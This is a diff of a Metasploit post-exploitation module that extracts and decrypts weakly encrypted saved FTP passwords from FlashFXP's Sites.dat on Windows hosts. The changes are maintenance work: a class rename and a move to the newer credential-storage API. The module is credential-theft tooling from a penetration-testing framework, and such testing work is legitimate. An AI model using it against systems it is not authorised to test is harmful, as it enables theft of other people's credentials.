@@ -1,15 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rex/parser/ini'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -18,7 +15,7 @@ class Metasploit3 < Msf::Post
     super(update_info(info,
       'Name'          => 'Windows Gather FlashFXP Saved Password Extraction',
       'Description'   => %q{
-        This module extracts weakly encrypted saved FTP Passwords  from FlashFXP. It
+        This module extracts weakly encrypted saved FTP Passwords from FlashFXP. It
         finds saved FTP connections in the Sites.dat file. },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'theLightCosine'],
@@ -84,19 +81,32 @@ class Metasploit3 < Msf::Post
         passwd = decrypt(epass)
 
         print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
-        if session.db_record
-          source_id = session.db_record.id
-        else
-          source_id = nil
-        end
-        report_auth_info(
-          :host  => host,
-          :port => port,
-          :sname => 'ftp',
-          :source_id => source_id,
-          :source_type => "exploit",
-          :user => username,
-          :pass => passwd)
+        service_data = {
+          address: Rex::Socket.getaddress(host),
+          port: port,
+          protocol: "tcp",
+          service_name: "ftp",
+          workspace_id: myworkspace_id
+        }
+
+        credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          username: username,
+          private_data: passwd,
+          private_type: :password
+        }
+
+        credential_core = create_credential(credential_data.merge(service_data))
+
+        login_data = {
+          core: credential_core,
+          access_level: "User",
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        create_credential_login(login_data.merge(service_data))
       end
     rescue
       print_status("Either could not find or could not open file #{filename}")
